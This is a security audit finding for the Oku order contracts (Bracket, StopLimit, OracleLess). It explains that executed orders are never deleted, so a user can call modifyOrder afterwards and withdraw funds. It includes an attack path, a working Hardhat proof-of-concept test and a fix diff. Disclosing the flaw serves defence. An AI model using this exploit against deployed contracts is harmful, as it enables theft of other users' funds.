# A user can steal funds after his order was executed

### Summary

A vulnerability was discovered in `Bracket::performUpkeep` where `orderId` is removed from the `pendingOrderIds`, but it still remains active. Similar case for `StopLimit::performUpkeep` and `OracleLess::fillOrder`, where order are not deleted from mapping after orders are executed

### Root Cause

In `Bracket::performUpkeep`, `orderId` is removed from the `pendingOrderIds`, but the order is not deleted. So when the user calls `modifyOrder` with the same `orderId` and `increasePosition` false, he can still pull funds from the contract. Same case for `StopLimit::performUpkeep` and in case of `OracleLess::fillOrder`, order is not deleted after orders are fulfilled.

### Attack Path

1. User creates an order calling `createOrder`
2. A keeper or bot calls `performUpkeep` when the order is executable
3. User now calls `modifyOrder` with argument `increasePosition` to false and `amountInDelta` such that it passes the condition in line [264](https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/Bracket.sol#L264)
In this way any user can steal funds from the contract

### Impact

Loss of funds from the contract. Other users will be affected

### PoC

Paste the following code in `test/triggerV2/happyPath.ts`:
```javascript
it("Steal funds after performUpkeep in Bracket", async () => {
        await stealMoney(s.wethWhale, await s.Frank.getAddress(), await s.WETH.getAddress(), s.wethAmount)
        await stealMoney(s.wethWhale, await s.Bracket.getAddress(), await s.WETH.getAddress(), s.wethAmount * 2n)
        await stealMoney(s.usdcWhale, await s.Bracket.getAddress(), await s.USDC.getAddress(), s.usdcAmount * 2n)

        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())

        await s.WETH.connect(s.Frank).approve(await s.Bracket.getAddress(), s.wethAmount)
        await s.Bracket.connect(s.Frank).createOrder(
            "0x",
            currentPrice,
            currentPrice,
            s.wethAmount,
            await s.WETH.getAddress(),
            await s.USDC.getAddress(),
            await s.Frank.getAddress(),
            5,
            500,
            500,
            false,
            "0x"
        )

        const filter = s.Bracket.filters.OrderCreated
        const events = await s.Bracket.queryFilter(filter, -1)
        const event = events[0].args
        orderId = (event[0])

        const result = await s.Bracket.checkUpkeep("0x")

        //get returned upkeep data
        const data: MasterUpkeepData = await decodeUpkeepData(result.performData, s.Frank)

        //get minAmountReceived
        const minAmountReceived = await s.Master.getMinAmountReceived(data.amountIn, data.tokenIn, data.tokenOut, data.bips)

        //generate encoded masterUpkeepData
        const encodedTxData = await generateUniTx(
            s.router02,
            s.UniPool,
            await s.Bracket.getAddress(),
            minAmountReceived,
            data
        )

        // perform upkeep
        await s.Bracket.performUpkeep(encodedTxData)

        const wethBalanceBefore = await s.WETH.balanceOf(await s.Frank.getAddress())
        console.log("Weth balance before: ", wethBalanceBefore)

        expect(wethBalanceBefore).to.be.equal(0)

        await s.Bracket.connect(s.Frank).modifyOrder(
            orderId.toString(),
            currentPrice,
            currentPrice + BigInt(1e18),
            s.wethAmount / 2n,
            await s.USDC.getAddress(),
            s.Frank,
            500,
            500,
            false,
            false,
            "0x"
        )

        const wethBalanceAfter = await s.WETH.balanceOf(await s.Frank.getAddress())
        console.log("Weth balance after: ", wethBalanceAfter)

        // user just pulled funds from the contract even after his order was executed
        expect(wethBalanceAfter).to.greaterThan(wethBalanceBefore)
        expect(wethBalanceAfter).to.be.equal(s.wethAmount / 2n)
    })
```
run `npm run test`

### Mitigation

delete the order after executing the order in `performUpkeep`:
```diff
function performUpkeep(
        bytes calldata performData
    ) external override nonReentrant {
        /// .....

        //send tokenOut to recipient
        order.tokenOut.safeTransfer(order.recipient, adjustedAmount);

        //refund any unspent tokenIn
        //this should generally be 0 when using exact input for swaps, which is recommended
        if (tokenInRefund != 0) {
            order.tokenIn.safeTransfer(order.recipient, tokenInRefund);
        }

        //emit
        emit OrderProcessed(order.orderId);
+       delete orders[orderId];
    }
```
Similar implementation for `StopLimit::performUpkeep` and `OracleLess::fillOrder`, order should be deleted from mapping after it is fulfilled
